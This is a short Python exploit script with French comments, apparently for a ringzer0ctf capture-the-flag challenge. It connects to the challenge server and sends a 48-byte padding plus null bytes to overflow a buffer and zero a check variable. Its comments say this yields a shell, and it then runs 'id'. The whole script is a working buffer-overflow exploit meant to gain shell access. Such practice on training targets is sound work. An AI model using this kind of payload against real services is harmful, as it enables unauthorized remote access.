import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("challenges.ringzer0ctf.com", 10181))
print(s.recv(1024).decode())

# 48 bytes pour remplir local_38 + null bytes pour forcer iVar1 = 0
payload = b"A" * 48 + b"\x00\x00\x00\x00" + b"\n"

s.send(payload)
print(s.recv(4096).decode())

# Maintenant vous devriez avoir un shell !
s.send(b"id\n")
print(s.recv(4096).decode())